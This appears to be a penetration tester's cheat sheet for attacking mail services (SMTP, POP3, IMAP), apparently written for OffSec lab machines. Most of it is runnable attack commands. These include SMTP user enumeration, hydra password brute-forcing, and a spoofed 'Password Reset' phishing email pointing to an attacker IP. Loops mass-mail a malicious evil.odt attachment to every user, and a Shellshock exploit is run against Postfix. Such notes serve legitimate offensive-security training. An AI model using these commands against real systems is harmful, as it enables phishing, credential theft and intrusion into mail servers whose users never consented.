# Mail - SMTP 25 465 587, IMAP 143 993, POP 110 995

### First Thoughts

- Phishing
	- Windows or Linux?
	- NTLM grab, link to local server, library file, reverse shell?
	- What type of file?

- Enumeration
	- Check for valid users
	- Try valid usernames elsewhere
		- Perhaps username as their password
		- Non-person names ran through rule list for password

- Exploits
	- Haven't done in 200+ boxes so far (remotely)


#### Basic enumeration

```bash
sudo nmap -n -v -p $RPORT_SMTP --script="smtp-* and safe" -oA smtp $RHOST

# enumerate users
sudo nmap -n -v -p $RPORT_SMTP --script="smtp-enum-users" -oA smtp-users $RHOST

# enumerate each user
vi smtp-user.txt  # write what smtp-enum-users told
## use MODE = {EXPN, VRFY, RCPT}
smtp-user-enum -M MODE -U smtp-user.txt -D $DOMAIN -t $RHOST
````

#### Manual user enum

```bash
nc -nv $ip 25
telnet $ip 25
EHLO ALL
VRFY <USER>
```

```bash
# Scrape website
cewl http://postfish.off/team.html -m 5 -w team.txt 
# Get valid names
smtp-user-enum -U valid.txt -t postfish.offsec
smtp-user-enum -U valid.txt -t postfish.off
smtp-user-enum -U /opt/SecLists/Usernames/xato-net-10-million-usernames-dup-lowercase.txt -t walla

curl -k "imaps://$dom/INBOX;MAILINDEX=1" --user sales:sales
telnet $ip 110
USER sales
PASS sales
list

# We opened up an email saying there would be a password reset link being sent out from it
sudo nc -lvp 80
sendemail -t brian.moore@postfish.off -f it@postfish.off -s postfish.off -u "Password Reset" -o tls=no
sendemail -t root@postfish.off -f brian.moore@postfish.off -s postfish.off -u "Password Reset" -o tls=no

# Or

nc -v postfish.off 25
helo test
mail from: it@postfish.off
rcpt to: brian.moore@postfish.off
DATA

Subject: Password reset

Hi Brian,

Please follow this link to reset your password: http://192.168.45.178/

Regards,

.

QUIT
```

```bash
for name in $(cat valid.txt); for name2 in $(cat valid.txt); do sudo swaks --to $name@$dom --from $name2@$dom --server $dom --attach @evil.odt --body 'smokum' --header 'Subject: king' ; wait ; done

for name in $(cat valid.txt); for name2 in $(cat valid.txt); do sudo swaks --to $name@localhost --from $name2@localhost --server $dom --attach @evil.odt --body 'smokum' --header 'Subject: king' ; wait ; done

for name in $(cat valid.txt); for name2 in $(cat valid.txt); do echo "sudo swaks --to $name@$dom --from $name2@$dom --server $dom --attach @evil.odt --body 'smokum' --header 'Subject: king'" >> all-swaks.txt; done

for line in $(cat all-swaks.txt); do echo $line|bash; done

# Sometimes the base of the domain, banzai instead of banzai.local, works better
for user1 in $(cat users.txt); for user2 in $(cat users.txt); do echo "sendemail -t $user1@$dom -f $user2@$dom -s $dom -u 'Password Reset' -m 'Please follow this link to reset your password: http://$myip/' -a /home/kali/oscp/twe/windows-evil.odt -o tls=no"|bash; done

for user1 in $(cat valid.txt); for user2 in $(cat valid.txt); do echo "sendemail -t $user1@$dc -f $user2@$dc -s $dc -u 'Password Reset' -m 'Please follow this link to reset your password: http://$myip/' -o tls=no"|bash; done
```

##### Exploits Found

SMTP PostFix Shellshock

```
https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py 10.11.1.231 useradm@mail.local 192.168.119.168 139 root@mail.local #VRFY both useradm and root exist
```

## Pop 110 & 995

```bash
nmap -n -v -p $port -sV --script="pop3-* and safe" -oA pop3 $ip
```

```bash
hydra -V -f -l $user -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $ip pop3
hydra -l simon -P /usr/share/wordlists/rockyou.txt -f $ip pop3
```

```bash
openssl s_client -connect $ip:pop3s # or fqdn
```

Telnet to port 110 with valid creds to look at mailbox.

```bash
telnet $ip $port   # alternate method
user $user@$dom # or $user , see if it's a valid name
PASS $PASS
LIST # gets list of emails and sizes
RETR 1 # retrieve first email
# try real (root) and fake users to see if there is a difference in error msgs
```

```bash
telnet -l jess $ip
USER sales
PASS sales
LIST
RETR 1.
```

## IMAP 143 993

```bash
hydra -V -f -L user.txt -P /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt $RHOST imap
```

#### Log in

```bash
curl -k "imaps://$ip" --user $user:$pass
```

#### Connect

```bash
openssl s_client -connect $ip:imaps # or fqdn
```